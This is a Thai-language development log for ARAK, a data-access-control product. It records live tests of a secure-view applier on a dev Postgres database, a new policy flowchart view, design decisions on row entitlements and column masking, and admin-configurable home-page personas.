### AW.9 ทดสอบสดผ่าน `:8090/Arak/` (รูปแบบ prod — jar เสิร์ฟ `dist`)

ตัว candidate เดียวคือ `demo-pg.salesdb.sales.customer` → `sec.customer` (Postgres dev ใน `dac-srcpg`)

| ขั้น | ผล |
|---|---|
| list | 200 · populationLimit 2000 |
| dry run | 200 · 5 principal · 3 allowed · 9 live column · uncatalogued 0 · DDL ถูก |
| analyst_a เรียก list / apply | **403** ทั้งคู่ |
| reviewId มั่ว | 400 |
| apply ด้วย `arak_reader` (read-only) | **502** *"permission denied for database salesdb"* → state `FAILED` + audit `FAILED` · ไม่มีอะไรค้างที่ source |
| ใช้ review เดิมซ้ำ | **409** audit `STALE` |
| (ให้ `CREATE ON DATABASE` ชั่วคราวใน container dev) dry run ใหม่ + apply | 200 · 6 statement · 7 แถว insert · `APPLIED` |
| `SET ROLE analyst_a` → `SELECT * FROM sec.customer` | เห็น 2 จาก 4 แถว (BKK-01 เท่านั้น) · email `***@example.co.th` · citizen `********23456` |
| `SET ROLE analyst_b` | 0 แถว |
| rollback | 200 · 1 statement · `NOT_ENFORCED` · view หายจริง |
| rollback ซ้ำ | **409** audit `REFUSED` |
| เก็บกวาด | drop role analyst_a/b · `DROP SCHEMA acl CASCADE` · `DROP SCHEMA sec CASCADE` · `REVOKE CREATE` → schema เหลือ `public` + `sales` เหมือนเดิม · `has_database_privilege` = false |

> ถ้า dry run ครั้งหลังเห็นว่า "allowed" เหลือ 1 — ไม่ใช่บั๊ก · `finance-subscription` มี time window และหลัง ~23:00 analyst_a ถูก deny (*"outside the policy's permitted time window"*)

### AW.10 ⚠️ ของที่ต้องรู้ก่อนใช้กับ source จริง

1. **credential ของ source ต้อง CREATE ได้** (schema `sec` + `acl` + view) · demo `arak_reader` เป็น read-only → apply ได้ `FAILED` ตามที่ควร · **follow-up: แยก credential สำหรับ DDL ออกจาก credential สำหรับ read** (ไม่อยากให้ credential ของ Query API ถือสิทธิ์ CREATE)
2. **cutover ยังไม่มี** — หลัง apply ต้อง GRANT SELECT บน view + REVOKE base table เอง (FR-6.1.1 = งานถัดไป)
3. review อยู่ในหน่วยความจำ (AW.4) — PM2 ต้อง `instances: 1`

### AW.11 กับดักที่เจอรอบนี้

| อาการ | สาเหตุ | แก้ |
|---|---|---|
| หน้าเว็บขาวหลัง restart · log บอก base path ผิด | **Git Bash แปลง `APP_WEB_BASE_PATH=/Arak/` เป็น `C:/Program Files/Git/Arak/`** (MSYS path conversion) | `export MSYS_NO_PATHCONV=1` ก่อน `set -a; . ./.env` ในสคริปต์ bring-up |
| `TaskStop` แล้ว port 8080 ยังไม่ว่าง | `exec java` กลายเป็น orphan | `Get-NetTCPConnection -LocalPort 8080` → `Stop-Process -Id <pid>` |
| heredoc ไม่เข้า `docker exec` | ไม่มี `-i` | `docker exec -i …` |
| `DROP ROLE` พัง | role ยังมีสิทธิ์บน schema `sec` | drop schema ก่อน แล้วค่อย drop role |
| JSON ของ `Rows` มี key `"empty"` เพิ่ม / `DryRun` มี `"satisfied"` | Jackson อ่าน `isEmpty()` / `isSatisfied()` เป็น property | ไม่มีผล — frontend `rowCount` อ่านแค่ 3 array · อย่าเอา `len()` ไปวนทุก key ใน script |
| `/decisions/simulate` 404 | ไม่มี endpoint นี้ | `POST /api/v1/decisions {principal, assetFqn, environment:"prod"}` |

### AW.12 ต่อจากนี้

- **slice 4: MSSQL Testcontainers** (dialect มีแล้ว ยังไม่เคยรันบน SQL Server จริง)
- credential แยกสำหรับ DDL (AW.10 ข้อ 1)
- **cutover helper (FR-6.1.1)** — REVOKE base table + GRANT view + optional rename swap
- `DbPrincipalProvisioner` → แล้ว `readerRole` จะไม่เป็น null
- ย้าย `ReviewedPlans` ลงตาราง ถ้าจะรันหลาย instance
- DriftDetector (M8) จะเป็นคนเขียน `DRIFTED` — ตอนนี้ยังไม่มีใครเขียนสถานะนี้

## รอบก่อนหน้า — **Policy Flowchart** — โหมดที่สอง ของทั้งคนเขียนและคนอ่าน policy

> โจทย์จากผู้ใช้: *"อันนี้คืออยากให้เปน feature เพิ่มนะ ไม่ใช่มาแทนที่หน้าเดิม แล้วแต่ว่าอยากให้มีทางเลือกให้ — คนสร้าง policy ว่าจะดูแบบ diagram flow หรือหน้า ui เดิม · คนอ่าน policy ก็ต้องมีโหมด text กับ diagram flowchart"* และ *"เปนภาพนะ / flow ที่พูดถึง"*

### AV.1 กฎข้อเดียวที่คุมทุกการตัดสินใจในรอบนี้: **ของเดิมต้องไม่ขยับ**

ทั้ง 2 หน้า **default เป็นของเดิมเป๊ะ** — คนที่ไม่กดสวิตช์จะไม่รู้เลยว่ามีอะไรเพิ่ม (นอกจากตัวสวิตช์เอง)
ค่าที่จำไว้ใน `localStorage` เป็น **override เท่านั้น** ไม่มีค่า = หน้าเดิม · อ่าน/เขียนหุ้ม `try/catch` ทั้งคู่ (private window ที่บล็อก site data จะ throw ทันที และ "หน้าที่เรนเดอร์ไม่ได้เพราะจำ preference ไม่ได้" ไม่คุ้ม)

| หน้า | สวิตช์ | default | คีย์ |
|---|---|---|---|
| `PolicyBuilderPage` (คนเขียน) | **Form / Flowchart** อยู่ใน header | `Form` | `arak.policy.view` |
| `PolicyDetailPage` (คนอ่าน) | **Text / Flowchart** อยู่บนหัวการ์ด *In plain words* | `Text` | `arak.policy.reading` |

### AV.2 ทำไมเป็น **model + renderer** ไม่ใช่ component เดียว

`policyFlow.ts` = pure function `buildFlow(policy) → FlowModel` · `PolicyFlowChart.tsx` = วาดอย่างเดียว
ข้อความในกล่องทุกบรรทัด**เรียกจาก `describe*` ตัวเดียวกับที่ประโยค "In plain words" ใช้** — diagram ที่มีความเข้าใจคำว่า `contains` เป็นของตัวเองจะแย่กว่าไม่มี diagram เลย เพราะมันคือ**คำอธิบายชุดที่สอง ที่สวยกว่า และผิด** ของเอกสารที่กำลังจะถูก publish

### AV.3 ทำไมเรียง **asset → คน → ผล** ไม่ใช่ตามหน้าฟอร์ม

เป็นลำดับที่ engine ใช้จริง: binding resolve กับ asset ก่อน → **policy ที่ selector ว่าง ตายตั้งแต่ด่านแรก ไม่ว่า subject จะเขียนดีแค่ไหน**
นี่คือความผิดพลาดที่ flowchart ควรโชว์ที่**กล่องแรก** ไม่ใช่กล่องสุดท้าย

**ทุกด่านต้องบอกทางออกของ "ไม่ผ่าน"** — เขียนไว้ว่า *"This policy is not bound to it"* / *"Another policy may still decide"* ไม่ใช่ปล่อยว่าง เพราะด่านที่ไม่บอกทางแยก คนอ่านจะเติมเองว่า "ไม่ผ่าน = ถูก deny" ซึ่ง**ไม่ใช่เรื่องเดียวกัน**

### AV.4 tone 4 แบบ — `open` แยกจาก `set` โดยตั้งใจ

| tone | เมื่อไหร่ | สี |
|---|---|---|
| `set` | เขียนครบ | เทา/ปกติ |
| `empty` | ยังไม่ได้เขียน → **selector ว่าง = ผูกกับ 0 asset** (ไม่ใช่ "ทุก asset") | เส้นประ |
| `open` | เขียนครบแล้ว **และผ่านทุกคน** (ไม่มี subject) | warning |
| `deny` | subscription DENY | error |

> กล่องที่ทุกคนผ่านได้คือกล่องที่ **authored ครบและ permissive เต็มที่** — ถ้าทาสีเหมือนกล่องที่แคบ นั่นคือวิธีที่ policy ถูก publish กว้างกว่าที่ตั้งใจ

### AV.5 ⚠️ trap ที่เสียเวลาไปหนึ่งรอบ: ชื่อไฟล์ชนกันบน Windows

`PolicyFlow.tsx` (component) กับ `policyFlow.ts` (model) — **filesystem ของ Windows ไม่แยกตัวพิมพ์** → `tsc` เด้ง `TS1261: file name differs only in casing` แล้ว import ไป resolve เข้าไฟล์ผิด (`has no default export`)
→ เปลี่ยนชื่อ component เป็น **`PolicyFlowChart.tsx`** (model ยังชื่อ `policyFlow.ts` คู่กับ `policyLanguage.ts` เหมือนเดิม)

### AV.6 ไม่ใช้ graph library

`reactflow` / `@antv/g6` = bundle ใหญ่กว่าทั้งหน้ารวมกัน · ดึงกล่องออกจาก DOM (เสีย text selection, keyboard focus, ลำดับที่ screen reader อ่าน) · และ**วาดด้วยสีของตัวเอง** ซึ่งขัดกับคำสั่ง *"เอาให้ทุกอย่างเหมือนเดิมนะ ความสวยงาม"* ตรงๆ
→ กล่อง = `div` + token เดิม · **เส้นเชื่อมกับหัวลูกศรเป็น SVG จริง** (ไม่ใช่ตัวอักษร `↓`) เพราะสิ่งที่ chart เพิ่มจาก list คือ "ลำดับ" และ "ด่านมีทางออกสองทาง" — ทั้งสองอย่างต้องเห็นเป็นเส้น

### AV.7 คลิกกล่องแล้วกลับไปแก้ได้ (เฉพาะโหมดคนเขียน)

`PolicyFlowChart` รับ `onEdit?` — **มีเมื่อแก้ได้เท่านั้น** ไม่ส่ง = กล่องเป็น text ธรรมดา ไม่มีปุ่ม (คนอ่านที่ไม่มีสิทธิ์แก้ต้องไม่เห็นปุ่มชวนแก้)
`Step` ใน `controls.tsx` ได้ `id={\`policy-step-${step}\`}` → คลิกกล่อง = สลับกลับเป็น Form **แล้วค่อย** `scrollIntoView` (ต้อง defer ด้วย `setTimeout(…, 0)` ไม่งั้น scroll ไปหา element ที่ยังไม่ถูกเรนเดอร์ แล้วคนใช้ค้างอยู่หัวหน้า)

### AV.8 ของที่เพิ่ม/แก้

| ไฟล์ | อะไร |
|---|---|
| `pages/policies/policyFlow.ts` | **ใหม่** — model ล้วน `buildFlow()` → `FlowModel { entry, steps[], exit, gate }` |
| `pages/policies/PolicyFlowChart.tsx` | **ใหม่** — renderer, SVG connector + branch arrow, responsive |
| `pages/policies/policyFlow.test.ts` | **ใหม่ 9 tests** |
| `pages/policies/PolicyFlowChart.test.tsx` | **ใหม่ 3 tests** |
| `pages/policies/controls.tsx` | + `ViewToggle` · `useViewMode` · `Step` มี `id` |
| `pages/policies/PolicyBuilderPage.tsx` | สวิตช์ใน header · คอลัมน์ฟอร์มสลับเป็น chart · `editStep()` |
| `pages/policies/PolicyDetailPage.tsx` | `Panel` รับ `action` · สวิตช์ Text/Flowchart |
| `pages/policies/policyLanguage.ts` | `describePrincipal` เป็น `export` (model เรียกใช้ซ้ำ) |

### AV.9 ยังไม่ได้ทำ — view B "Layer Stack"

diagram ที่โชว์ว่า policy ตัวนี้จะถูก **global ทับ** หรือไม่ (ตรงกับบรรทัดในแผน: *"UI ต้องเตือนตอนสร้าง local policy ว่ามันจะถูก global ทับ"*) ยังทำไม่ได้ตอน**สร้าง** เพราะ `PolicyOverview.overlaps()` ต้องมี policy id ที่เซฟแล้ว
→ ต้องเพิ่ม **`POST /v1/policies/preview/conflicts`** ที่รับ draft ที่ยังไม่เซฟ แล้วคืน `Overlap[]` (ใช้ logic เดิม ไม่ต้องโหลดจาก DB)

## รอบก่อนหน้า — **M5 slice 3 (ครึ่งแรก): `SecureViewApplier`** — ครั้งแรกที่ secure view ของ ARAK ทำงานบนฐานข้อมูลจริง

slice 1 = view หน้าตายังไง · slice 2 = ใครได้อะไร · **ทั้งคู่เป็น pure function ไม่เคยแตะ database เลย**
slice 3 คือรอบที่มันออกจากห้องทดลอง — คลาสเดียวใน chain 5.1.2 ที่เปิด JDBC connection

### AU.1 สามเสาที่คลาสนี้ยืนอยู่ (เขียนไว้ใน javadoc ของคลาสด้วย)

| เสา | ทำอย่างไร | ถ้าไม่ทำจะเกิดอะไร |
|---|---|---|
| **view DDL กับแถว ACL ต้อง commit พร้อมกัน** | ทุกอย่างอยู่ใน transaction เดียว — `autoCommit=false` → DDL → delete → insert → `commit()` | commit คนละรอบ = มีช่วงเวลาที่คนอื่นเห็น **"ไม่มีใครเห็นอะไรเลย"** (view มาก่อน) หรือแย่กว่านั้น **"เห็นหมดทุกแถว"** (แถวมาก่อน view) |
| **dry-run ไม่ใช่คำสัญญา** | `apply()` **รัน dryRun ซ้ำข้างในtransaction** แล้วเทียบ `signature()` ไม่ตรง → `StaleReviewException` ไม่ apply อะไรเลย | คนกดอนุมัติแผนเมื่อ 10 นาทีก่อน ระหว่างนั้น entitlement เปลี่ยน → สิ่งที่ apply ไม่ใช่สิ่งที่มีคนอ่าน (FR-6.4) |
| **ลบก่อนเขียน** | `delete(...)` มาก่อน `insert(...)` เสมอ | `column_grant` มี PK `(principal, asset, column_name)` — treatment ที่เปลี่ยนคือ **delete+insert ของ PK เดียวกัน** ถ้าเขียนก่อนลบจะชน |

### AU.2 ⚠️ `WHERE` ที่หายไปหนึ่งอันคือความต่างระหว่าง apply policy กับ revoke ทั้งฐานข้อมูล

ทุก read และ write ใน `read()` / `delete()` / `insert()` ถูก **scope ด้วย asset key เสมอ**
เหตุผลไม่ใช่เรื่อง performance: `maintain(...)` คำนวณ **desired state เต็ม แล้ว diff กับ installed** ถ้า `read()` เผลอคืนแถวของ asset อื่นมาปนเป็น "สภาพปัจจุบันของ asset นี้" maintainer จะทำงาน**ถูกต้องตามที่ถูกบอก** — คือคำนวณ `delete` ให้แถวของ asset อื่นทั้งหมด แล้ว apply ก็จะลบจริง เงียบๆ สำเร็จ ไม่มี error
→ มีเทสต์ยิงตรงจุดนี้: `oneAssetsMaintenanceLeavesEveryOtherAssetAlone`

### AU.3 การตัดสินใจอื่น

| เรื่อง | ทำอย่างไร | เพราะ |
|---|---|---|
| `acl.*` ยังไม่มีในฐานข้อมูล | `read()` คืน `Rows.NONE` (เช็คด้วย `DatabaseMetaData.getTables` ทั้งตัวพิมพ์ตามที่ให้มาและตัวพิมพ์ใหญ่) | รอบแรกสุดยังไม่มีอะไร — ต้องไม่ใช่ error |
| ลบ `column_grant` | match แค่ `(principal, asset, column_name)` **ไม่รวม treatment** | treatment ที่เปลี่ยนต้องถูกลบด้วยคีย์เก่าให้ได้ ไม่งั้น insert ชน PK |
| `apply(request, null)` | `NullPointerException` — *"no approved dry run; applying without one would run a change nobody read (FR-6.4)"* | ปิดทางที่ caller จะข้าม review ไปเฉยๆ |
| `openWritable(...)` แยกจาก `open(...)` | เมธอดคนละตัวใน `JdbcTargets` | `open` เป็น read-only มาตลอด — การหยิบ connection ที่แก้ฐานข้อมูลลูกค้าได้ ต้องเป็นสิ่งที่ caller **พิมพ์ออกมาเอง** ไม่ใช่ได้มาโดยบังเอิญ |
| driver คืน `SUCCESS_NO_INFO` | `total(int[])` นับเป็น 1 | บาง driver ไม่บอกจำนวนแถวใน batch — นับเป็น 0 จะรายงานผิดว่าไม่ได้ทำอะไร |
| `rollback()` | REVOKE + `DROP VIEW IF EXISTS` เท่านั้น — **ไม่แตะ schema `acl`** | secure view ทุกตัวในฐานข้อมูลอ่านตาราง 3 ใบเดียวกัน · drop ทิ้ง = พัง asset อื่นหมด |

### AU.4 `signature()` — ของชิ้นเดียวที่กั้นระหว่าง "แผนที่มีคนอ่าน" กับ "แผนอื่น"

พังได้ 2 ทาง และพังคนละทิศ:
- **ไม่ stable** → ทุก apply ถูกปฏิเสธว่า stale → ฟีเจอร์ใช้ไม่ได้
- **ชนกัน (2 diff ได้ signature เดียว)** → apply สิ่งที่ไม่มีใครอ่าน

`SecureViewApplierTest` (6 tests, ไม่ต้องใช้ Docker) ยิงทั้งสองทิศ: ลำดับการใส่ set ไม่มีผล · insert กับ delete ของแถวเดียวกันต้องไม่เท่ากัน · treatment ที่เปลี่ยนต้องเห็นใน signature · diff ว่างต้องได้ string ว่าง

### AU.5 `SecureViewApplierIT` — 11 tests บน `postgres:16-alpine`

> สิ่งที่มันพิสูจน์ไม่ใช่ว่า statement รันผ่าน — แต่คือ **คนสองคนที่มีสิทธิ์ต่างกัน select จาก view ใบเดียวกัน ในฐานข้อมูลเดียวกัน แล้วได้คำตอบคนละอย่าง**

fixture: `sales.customer(id, email, citizen_id, branch_code)` 3 แถว (BKK-01 / CNX-01 / SGN-01) · login `analyst_a`, `analyst_b` สร้างใหม่ทุกเทสต์ และ**ไม่มีสิทธิ์อะไรบน base table เลย**

| เทสต์ | พิสูจน์อะไร |
|---|---|
| `theViewShowsEachReaderWhatTheirPolicySays` | a เห็น BKK-01/CNX-01 email = `***@example.com` citizen = `*********1111` · b เห็น SGN-01 email/citizen = `null` — **view ใบเดียว คำตอบคนละชุด** |
| `theBaseTableIsNotReadable` | `permission denied` บน `sales.customer` |
| `oneAssetsMaintenanceLeavesEveryOtherAssetAlone` | แถวของ `hr.employee` รอดทั้งหมด (ดูข้อ AU.2) |
| `aStaleReviewIsRefused` | แก้แถวหลัง dry-run → `StaleReviewException` และ **ไม่มีอะไรถูก apply** |
| `aFailureRollsBackTheWholeChange` | พังกลาง plan → ไม่เหลือ schema/แถวค้าง |
| `applyingTwiceIsIdempotent` · `revokingAPrincipalTakesTheirRowsAway` · `aChangedTreatmentReplacesTheRowItReplaces` · `rollbackDropsTheViewOnly` · `applyingUnreviewedIsRefused` · `nothingInstalledMeansEverythingIsAnInsert` | |

⚠️ **`PARTIAL` + `showLast(4)` แปลงเป็น `*********1111` ไม่ใช่ `1111`** — มันใส่ดาวแทนส่วนหน้า ไม่ได้คืนแค่ 4 ตัวท้าย (เสียเวลากับเรื่องนี้ไป 1 รอบเทสต์)

### AU.6 ของที่เพิ่ม/แก้

| ไฟล์ | อะไร |
|---|---|
| `dac-connector-source/…/SecureViewApplier.java` | **ใหม่** — `dryRun` / `apply` / `rollback` / `read` · record `Request` `DryRun` `Applied` · `StaleReviewException` |
| `dac-connector-source/…/SecureViewApplierIT.java` | **ใหม่ 11 tests** Testcontainers |
| `dac-connector-source/…/SecureViewApplierTest.java` | **ใหม่ 6 tests** — signature ล้วน ไม่ต้องใช้ Docker |
| `dac-connector-source/…/JdbcTargets.java` | `openWritable(...)` |
| `dac-connector-source/pom.xml` | + `dac-compiler-sql` (ครั้งแรกที่ module นี้เห็น compiler) |
| `dac-compiler-sql/…/ViewCompiler.java` | `Target.acl(...)` เป็น public — applier เขียนแถวลงตารางเดียวกับที่ compiler อ่าน **ชื่อตารางสองสะกดที่หลุดจากกันคือ view อ่านใบนึง แถวลงอีกใบ เงียบๆ และในทิศที่ผ่อน** |

### AU.7 ต่อจากนี้ (M5 slice 3 ครึ่งหลัง)

`EntitlementSource` implementation อ่านจาก `row_entitlement` ของ app DB · store ของ `enforcement_state` (**ตาราง V4 มีอยู่แล้ว ไม่ต้อง migrate**) · REST dry-run / apply / rollback · UI + **เอาเมนู Enforcement กลับมา**
⚠️ **`ViewCompiler` + `SecureViewApplier` ยังไม่ถูก wire เข้า `dac-service` เลย** — และตอน wire ต้องส่ง `CredentialResolver` **ตัวที่ `DacApplication` ถืออยู่** เข้าไป ห้ามสร้างใหม่
slice 4: MSSQL Testcontainers

## รอบก่อนหน้า — **M5 slice 2: `RowEntitlementMaintainer`** — อีกครึ่งของ secure view

slice 1 (`ViewCompiler`) ตอบว่า *"view หน้าตายังไง"* แต่ view เป็น object เดียวที่ทุกคนใช้ร่วมกัน มัน**พูดชื่อคนไม่ได้**
slice 2 คือครึ่งที่ตอบว่า *"ใครได้อะไร"* — เนื้อในของตาราง ACL 3 ใบที่ view join ตอนอ่าน (FR-6.1)

### AT.1 ⚠️ แก้ความเข้าใจผิดจากข้อ AK.9 — **slice 2 ไม่ต้องมี migration**

AK.9 เขียนไว้ว่า slice 2 = `V12__row_entitlement.sql` + maintainer **ข้อแรกผิด** ตาราง 3 ใบนี้อยู่ที่ **source database ไม่ใช่ app DB**:

```
acl.asset_subscription (principal, asset)                          PK(principal, asset)
acl.row_entitlement    (principal, asset, entitlement_key, value)  PK(ทั้ง 4)
acl.column_grant       (principal, asset, column_name, treatment)  PK(principal, asset, column_name)
```

`ViewCompiler.apply()` สร้างมันให้อยู่แล้วตอน apply ลง source → **ไม่มีอะไรต้อง migrate ใน app DB**
ส่วน `row_entitlement` ของ app DB (`V3__policy.sql:99`) เป็น**คนละใบ** — ใบนั้นคือ*แหล่งข้อมูล* ที่ maintainer ไปอ่านค่าของ `ENTITLEMENT_JOIN` มา ไม่ใช่ปลายทางที่เขียนลง

### AT.2 สองทางที่มันจะรั่วเงียบๆ — และทำไมต้อง **refuse ไม่ใช่ skip**

จุดที่คลาสนี้ต่างจาก maintainer ธรรมดาคือมัน**โยน exception** ในเคสที่ดูเหมือนควรจะข้ามไปเฉยๆ เหตุผลเดียวกันทั้งสองเคส: *view ก็ยัง valid, แถวก็ยัง valid, apply ก็สำเร็จ, เปิดฐานข้อมูลดูก็ถูกหมด* — แต่ข้อมูลไปถึงคนที่ policy ไม่ได้ส่งให้

| เคส | ถ้าเขียนลงไปเฉยๆ | ทำแทน |
|---|---|---|
| treatment key ไม่มีอยู่ใน `Plan.treatments()` ของ column นั้น | ไม่ match branch ไหนเลย → คนอ่านตกไปที่ `ELSE` เงียบๆ · **ทิศอันตราย** = decision ใหม่เข้มกว่า fallback ที่ติดตั้งอยู่ → อ่านได้มากกว่าที่ policy อนุญาต | `MismatchedPlanException` — "Recompile the view from these decisions before maintaining its rows." |
| entitlement key ไม่มีใน `Plan.entitlementKeys()` | view ไม่ได้ join คีย์นั้น → เขียนแถวไปก็ไม่ได้กรองอะไร **ทุกแถวกลับมาหมด** | refuse เหมือนกัน |
| policy mask column ที่ view select ดิบๆ (ตอน compile ยังไม่มีใคร mask) | ไม่มีแถวไหนในตารางทั้ง 3 ใบที่ทำให้ view mask ได้ → **อ่านได้ในรูปแบบดิบ** | refuse — "they would read it in the clear" |

> ทิศตรงข้าม (view มี gate แต่คนนี้ไม่มีค่าเลย) **ไม่ refuse** เพราะมันปิดไม่ใช่เปิด — แค่ใส่ note ว่า "Nothing gives X any value of Y … They will read no rows of this asset until something does."

### AT.3 การตัดสินใจอื่นที่เป็นเรื่องความหมาย ไม่ใช่รายละเอียด

| เรื่อง | ทำอย่างไร | เพราะ |
|---|---|---|
| **`ALWAYS_FALSE`** | **ไม่ออกแถว `asset_subscription` ให้เลย** | view เขียน `1=0` ให้คนเดียวไม่ได้ — การไม่ให้ subscription พูดประโยคเดียวกันเป๊ะ |
| **plaintext ต้องมีแถว** | ถ้า `PLAIN` ไม่ใช่ fallback ของ column นั้น → ต้องเขียน `column_grant` ที่ treatment = `PLAIN` | `maskedColumn()` ใส่ `PLAIN` เป็น candidate ตัวหนึ่งเสมอ การ "ไม่มี mask" จึงไม่เท่ากับ "ไม่ต้องขออะไร" |
| **fallback ไม่ต้องมีแถว** | คนที่ได้ treatment เดียวกับ `ELSE` → ข้าม | เขียนไปก็แค่ทำให้ตารางใหญ่ขึ้นโดยไม่เปลี่ยนอะไร |
| **hidden column** | **ไม่ออกแถว** + note | hide ชนะ mask (FR-4.5) แต่ view ตัด column ให้คนเดียวไม่ได้ → ปล่อยให้ตกไปที่ fallback ซึ่งเป็นสิ่งที่เข้มที่สุดที่ view ทำกับ column นั้นได้ · ⚠️ **ถ้าตีความว่า "ไม่มี mask = PLAIN" จะกลายเป็นการ grant plaintext ให้คนที่ policy สั่งซ่อน** — มีเทสต์ยิงตรงจุดนี้ |
| **denied principal** | ไม่เหลืออะไรเลยทั้ง 3 ใบ | ถ้าปล่อยแถวค้างไว้ วันที่มีคนไปกด subscribe ใหม่ด้วยมือ เขาจะได้สิทธิ์เก่ากลับมาทั้งชุด |
| **คำนวณ desired state เต็ม แล้ว diff** | ไม่ใช่ "emit เฉพาะ insert ที่รู้" | ตารางทั้ง 3 ใบถูกอ่านด้วย `EXISTS` → **แถวที่ควรถูกลบแล้วไม่ถูกลบ คือความพังที่สำคัญ** ไม่ใช่แถวที่ควรเขียนแล้วไม่ได้เขียน · การ revoke จึงต้องมาจาก `delete` ของ diff |
| **negated gate (`NOT_IN` / `NE`)** | เขียนค่าเหมือนเดิม | `gate()` ของ compiler ทำ `NOT EXISTS` ให้แล้ว → แถวพวกนั้นคือค่าที่เขา **ห้าม**เห็น ไม่ใช่ที่อนุญาต อ่านโค้ดตรงนี้ต้องระวัง |
| **`EXISTS` / `NOT_EXISTS`** | ไม่ออกแถว | ไม่ได้ถามอะไรเกี่ยวกับคนอ่าน |
| **`RAW_PREDICATE`** | ไม่ออกแถว | ประโยคเดียวกันสำหรับทุกคน อยู่ใน view แล้ว เขียนซ้ำ = สำเนาที่ 2 ที่ต้องคอยดูแลให้ตรงกัน |
| **mask ซ้ำ column เดียวใน decision เดียว** | เข้มสุดชนะ เสมอกันถือครองเดิม (`MaskStrength`) | engine ควรรีดให้เหลือตัวเดียวอยู่แล้ว — ที่ใส่ไว้เพื่อไม่ให้แถวที่ได้ขึ้นกับ*ลำดับ*ที่ engine เรียงมา |

### AT.4 `EntitlementSource` — ทำไมต้อง inject

`ENTITLEMENT_JOIN` เป็นเคสเดียวที่ **decision ไม่พกค่ามาด้วย** (mapping ใหญ่/เปลี่ยนบ่อยเกินกว่าจะ inline) → maintainer ต้องไปอ่านเอง
เป็น `@FunctionalInterface` ที่ slice 3 จะ implement ด้วย `row_entitlement` ของ app DB · `EntitlementSource.NONE` คืนค่าว่างเสมอ = **ซ่อนทุกแถวของคีย์นั้น** ซึ่งเป็นทิศที่ถูกเวลาพัง

### AT.5 ของที่เพิ่ม

| ไฟล์ | อะไร |
|---|---|
| `dac-compiler-sql/…/RowEntitlementMaintainer.java` | **ใหม่** — pure ทั้งคลาส ไม่มี JDBC · `maintain(plan, assetKey, decisions, entitlements, installed)` → `Maintenance {desired, insert, delete, notes}` · record `Subscription` / `Entitlement` / `ColumnGrant` / `Rows` · `MismatchedPlanException` |
| `dac-compiler-sql/…/RowEntitlementMaintainerTest.java` | **ใหม่ 17 tests** — ทุกเทสต์ **compile view จาก decision ชุดเดียวกับที่เอาไป maintain** เพราะสิ่งที่ต้องพิสูจน์คือสองครึ่งไม่หลุดจากกัน เทสต์ที่ hand-write plan เองจะพิสูจน์แค่ว่า maintainer ตรงกับคนเขียนเทสต์ |

### AT.6 ต่อจากนี้ (M5 slice 3)

JDBC applier: อ่าน `acl.*` ปัจจุบัน → `maintain(...)` → แสดง dry-run (`insert`/`delete` + `notes`) ให้คนกดอนุมัติ → apply ใน transaction เดียวกับ view DDL + `enforcement_state` + REST + UI + **เอาเมนู Enforcement กลับมา**
`EntitlementSource` implementation อ่านจาก `row_entitlement` ของ app DB · **`ViewCompiler` ยังไม่ถูก wire เข้า dac-service เลย** (`grep -rln ViewCompiler` เจอแค่ `DecisionSql` + ตัวมันเอง + เทสต์) — slice 3 คือรอบที่มันจะได้ออกจากห้องทดลอง

## รอบก่อนหน้า — **M12b Persona: หน้าแรกที่ admin จัดให้แต่ละ Platform Role** (ผู้ใช้ขอไว้ตั้งแต่รอบ M12)

ผู้ใช้สั่งไว้ว่า

> *"อันนี้ให้ Admin เป็นคน Confiure ให้ได้ ว่าแต่ละ Platform Role จะเห้นหน้าจอ Home ลักษณะแบบไหน เหมือนเป็น Persona ต่างๆ"*

M12 ให้ทุกคนจัดหน้าแรกของตัวเองได้แล้ว แต่ **หน้าแรกของคนที่ยังไม่เคยเปิด editor ถูกตัดสินอยู่ในโค้ด** — อยากให้ auditor เห็นคนละหน้ากับ requester ทำได้ทางเดียวคือแก้โค้ดแล้ว deploy ใหม่ รอบนี้ย้ายการตัดสินใจนั้นขึ้นมาบนหน้าจอ

### AS.1 ลำดับการ resolve — **personal → role → built-in** และทำไมต้องเรียงแบบนี้

```
GET /v1/home/layout
      │
      ├─ มีแถวใน home_layout ของ principal นี้ ?  ── ใช่ ──►  LayoutSource.PERSONAL
      │                                             (ไม่สนว่า admin ตั้ง persona ไว้หรือไม่)
      ├─ ไล่ persona ที่ถือ เรียงจากแรงสุด          ── เจอ ──►  LayoutSource.ROLE + sourceRole
      │   PLATFORM_ADMIN > POLICY_AUTHOR >
      │   DATA_OWNER > AUDITOR > REQUESTER
      └─ ไม่เจอเลย                                        ►  LayoutSource.BUILT_IN
```

**สามข้อที่เป็นการตัดสินใจ ไม่ใช่รายละเอียด:**

| การตัดสินใจ | เหตุผล |
|---|---|
| **personal ชนะ persona เสมอ** และ persona **ไม่ถูก copy ลง `home_layout`** | ถ้า copy ลงไปตอน admin กด Save คนที่จัดหน้าตัวเองไว้แล้วจะโดนรื้อ — persona คือ*จุดเริ่มต้น* ไม่ใช่*คำสั่ง* ถ้าอยากให้เป็นคำสั่งต้องเป็นฟีเจอร์คนละตัวที่มี audit คนละเรื่อง |
| **precedence ไม่ใช่ merge** | หน้าจอสองหน้า average กันไม่ได้ — ครึ่งนึงของอันนึงบวกครึ่งนึงของอีกอัน = หน้าที่ไม่มีใครออกแบบ |
| **ไล่ทั้งลิสต์ ไม่ใช่หยุดที่ role แรกที่ถือ** | ถ้าหยุดที่ตัวแรก การจัดหน้า AUDITOR จะไม่มีผลกับ auditor ที่เขียน policy ด้วย ซึ่งคือ auditor เกือบทั้งหมด |

> **ทำไม REQUESTER อยู่ล่างสุด:** เพราะเป็น role ที่แทบทุกคนถือติดตัว ถ้าเอาไว้บนสุด การจัดหน้า requester จะไปรื้อหน้าแรกของทุกคนในระบบเงียบๆ

### AS.2 ⚠️ ที่แรกในผลิตภัณฑ์ที่ **markup ของคนหนึ่ง ถูก render ใน session ของอีกคน โดยตั้งใจ**

`home_layout` ของ M12 คนเขียนกับคนอ่านเป็นคนเดียวกันเสมอ — `HomeLayoutValidator` มีไว้กันคนทำร้ายตัวเอง
`home_role_layout` **ไม่ใช่แบบนั้น** — note widget ที่ admin เซฟลง persona POLICY_AUTHOR จะถูก render ให้ policy author ทุกคนที่ยังไม่ได้จัดหน้าตัวเอง

ฉะนั้น:
- ล้างผ่าน `HomeLayoutValidator` **ทั้งตอนเขียนและตอนอ่าน** เหมือนเดิมทุกประการ — และคราวนี้ไม่ใช่ belt-and-braces แต่เป็นเส้นแบ่งจริง
- เขียนได้เฉพาะ `@Secured("PLATFORM_ADMIN")` — การจัดหน้า POLICY_AUTHOR คือการจัดหน้าของ policy author ทุกคน มันเป็น**การกระทำระดับ platform** ไม่ใช่ระดับ authoring
